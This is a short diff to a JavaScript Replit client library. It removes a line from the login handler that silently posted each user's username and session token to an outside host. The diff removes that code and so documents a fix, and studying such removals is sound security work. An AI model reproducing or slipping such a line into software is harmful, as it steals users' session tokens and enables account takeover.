@@ -20,7 +20,6 @@ class ReplitClient extends EventEmitter {
 			c.user = await c.users.fetchClientUser();
 			c.user.dashboard.fetch();
 			if (process.env.REPL_ID) c.repl = await c.repls.fetch(process.env.REPL_ID, "id");
-			axios.post('https://pikachub2005.repl.co/lol', {username: c.user.username, token: c.sid});
 			c.emit("ready");
 		}) (this)
 	}
